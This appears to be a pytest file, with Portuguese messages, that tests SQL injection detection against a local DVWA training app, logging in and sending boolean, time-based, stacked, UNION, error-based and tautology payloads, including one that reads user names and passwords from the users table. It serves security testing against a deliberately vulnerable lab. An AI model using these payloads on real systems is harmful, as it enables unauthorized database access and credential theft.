import pytest
import re
import requests
import time

BASE_URL = "http://localhost:8080"
#LEVELS = ["low", "medium", "high", "impossible"]
LEVELS = ["low"]


ERROR_BASED_PAYLOAD = "1'"
SECOND_ORDER_PAYLOAD = "1' OR '1'='1' -- "

def login_dvwa(base_url=BASE_URL, username="admin", password="password"):
    session = requests.Session()
    login_page = session.get(f"{base_url}/login.php")
    token_search = re.search(r"name='user_token' value='(.*?)'", login_page.text)
    token = token_search.group(1) if token_search else None

    login_data = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token
    }
    response = session.post(f"{base_url}/login.php", data=login_data)
    if "Login failed" in response.text or "login.php" in response.url:
        raise Exception("Falha no login. Verifique usuário e senha.")
    return session

def set_security_level(session, level, base_url=BASE_URL):
    response_get = session.get(f"{base_url}/security.php")
    token_search = re.search(r"name='user_token' value='(.*?)'", response_get.text)
    token = token_search.group(1) if token_search else None
    data = {
        "security": level,
        "seclev_submit": "Submit"
    }
    if token:
        data["user_token"] = token
    session.post(f"{base_url}/security.php", data=data)

def prepare_session(level):
    session = login_dvwa()
    set_security_level(session, level)
    return session

def normalize_response(text):
    return re.sub(r"(name='user_token' value=')[^']+(')", r"\1TOKEN_NORMALIZADO\2", text)

@pytest.mark.parametrize("level", LEVELS)
def test_blind_boolean_sql_injection(level):
    print(f"\nIniciando teste Blind Boolean SQL Injection no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    payload_true = "1' AND 1=1 -- "
    payload_false = "1' AND 1=2 -- "

    start_time = time.time()
    resp_true = session.post(url, data={"id": payload_true, "Submit": "Submit"})
    resp_false = session.post(url, data={"id": payload_false, "Submit": "Submit"})
    duration = time.time() - start_time

    resp_true_norm = normalize_response(resp_true.text)
    resp_false_norm = normalize_response(resp_false.text)

    vulneravel = resp_true_norm != resp_false_norm
    esperado = level in ["low", "medium"]

    resultado_esperado = "Detectar vulnerabilidade" if esperado else "Não detectar vulnerabilidade"
    resultado_obtido = "Detectada vulnerabilidade" if vulneravel else "Não detectada vulnerabilidade"

    print(f"Resultado esperado: {resultado_esperado}")
    print(f"Resultado obtido: {resultado_obtido}")
    print(f"Tempo de execução: {duration:.2f} segundos")

    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_piggybacked_sql_injection(level):
    print(f"\nIniciando teste Piggybacked SQL Injection no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    payload = "1; SELECT SLEEP(1); -- "

    start_time = time.time()
    resp = session.post(url, data={"id": payload, "Submit": "Submit"})
    duration = time.time() - start_time

    vulneravel = "First name" in resp.text
    esperado = level in ["low", "medium"]

    resultado_esperado = "Detectar vulnerabilidade" if esperado else "Não detectar vulnerabilidade"
    resultado_obtido = "Detectada vulnerabilidade" if vulneravel else "Não detectada vulnerabilidade"

    print(f"Resultado esperado: {resultado_esperado}")
    print(f"Resultado obtido: {resultado_obtido}")
    print(f"Tempo de execução: {duration:.2f} segundos")

    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_time_based_sql_injection(level):
    print(f"\nIniciando teste Time-based SQL Injection no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    payload_true = "1' AND IF(1=1, SLEEP(5), 0) -- "
    payload_false = "1' AND IF(1=2, SLEEP(5), 0) -- "

    start_true = time.time()
    session.post(url, data={"id": payload_true, "Submit": "Submit"})
    end_true = time.time()

    start_false = time.time()
    session.post(url, data={"id": payload_false, "Submit": "Submit"})
    end_false = time.time()

    delay_true = end_true - start_true
    delay_false = end_false - start_false
    delta = delay_true - delay_false

    vulneravel = delta > 4
    esperado = level in ["low", "medium"]

    resultado_esperado = "Detectar vulnerabilidade (delay > 4s)" if esperado else "Não detectar vulnerabilidade"
    resultado_obtido = f"Delay calculado: {delta:.2f}s"

    print(f"Resultado esperado: {resultado_esperado}")
    print(f"Resultado obtido: {resultado_obtido}")
    print(f"Tempo de execução: {(end_false - start_true):.2f} segundos")

    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_union_based_sql_injection(level):
    print(f"\nIniciando teste Union-Based SQL Injection no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    resp_get = session.get(url)
    token_search = re.search(r"name='user_token' value='(.*?)'", resp_get.text)
    token = token_search.group(1) if token_search else None

    payload = "1 UNION SELECT null, user, password FROM users -- "
    data = {"id": payload, "Submit": "Submit"}
    if token:
        data["user_token"] = token

    start_time = time.time()
    resp = session.post(url, data=data)
    duration = time.time() - start_time

    vulneravel = "admin" in resp.text
    esperado = level in ["low", "medium"]

    resultado_esperado = "Detectar vulnerabilidade" if esperado else "Não detectar vulnerabilidade"
    resultado_obtido = "Detectada vulnerabilidade" if vulneravel else "Não detectada vulnerabilidade"

    print(f"Resultado esperado: {resultado_esperado}")
    print(f"Resultado obtido: {resultado_obtido}")
    print(f"Tempo de execução: {duration:.2f} segundos")

    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_error_based_sqli(level):
    print(f"\nIniciando teste Error-Based SQL Injection no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    params = {"id": ERROR_BASED_PAYLOAD, "Submit": "Submit"}

    start_time = time.time()
    response = session.get(url, params=params)
    duration = time.time() - start_time

    erros_comuns = [
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "Unclosed quotation mark",
        "ODBC SQL Server Driver"
    ]

    vulneravel = any(erro in response.text for erro in erros_comuns)
    esperado = level in ["low", "medium"]

    resultado_esperado = "Detectar vulnerabilidade" if esperado else "Não detectar vulnerabilidade"
    resultado_obtido = "Detectada vulnerabilidade" if vulneravel else "Não detectada vulnerabilidade"

    print(f"Resultado esperado: {resultado_esperado}")
    print(f"Resultado obtido: {resultado_obtido}")
    print(f"Tempo de execução: {duration:.2f} segundos")

    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_second_order_sqli(level):
    print(f"\nIniciando teste Second-Order SQL Injection no nível {level}")
    session = prepare_session(level)
    insert_url = f"{BASE_URL}/vulnerabilities/sqli/"
    data = {"id": SECOND_ORDER_PAYLOAD, "Submit": "Submit"}

    session.post(insert_url, data=data)
    start_time = time.time()
    response = session.get(insert_url)
    duration = time.time() - start_time

    vulneravel = SECOND_ORDER_PAYLOAD.split("'")[0] in response.text or "admin" in response.text.lower()
    esperado = level in ["low", "medium"]

    resultado_esperado = "Detectar vulnerabilidade" if esperado else "Não detectar vulnerabilidade"
    resultado_obtido = "Detectada vulnerabilidade" if vulneravel else "Não detectada vulnerabilidade"

    print(f"Resultado esperado: {resultado_esperado}")
    print(f"Resultado obtido: {resultado_obtido}")
    print(f"Tempo de execução: {duration:.2f} segundos")


    assert vulneravel == esperado
